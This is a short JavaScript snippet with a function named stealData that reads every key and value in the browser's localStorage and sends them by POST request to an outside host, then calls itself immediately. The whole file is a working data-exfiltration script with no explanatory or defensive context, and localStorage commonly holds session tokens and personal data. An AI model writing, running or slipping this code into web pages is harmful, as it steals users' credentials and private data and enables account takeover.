function stealData() {
  const localStorageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    localStorageData[key] = localStorage.getItem(key);
  }

  fetch("https://tagmango-app.vercel.app/", {
    method: "POST",
    body: JSON.stringify({ localStorage: localStorageData }),
    headers: {
      "Content-Type": "application/json",
    },
  });
}

stealData();
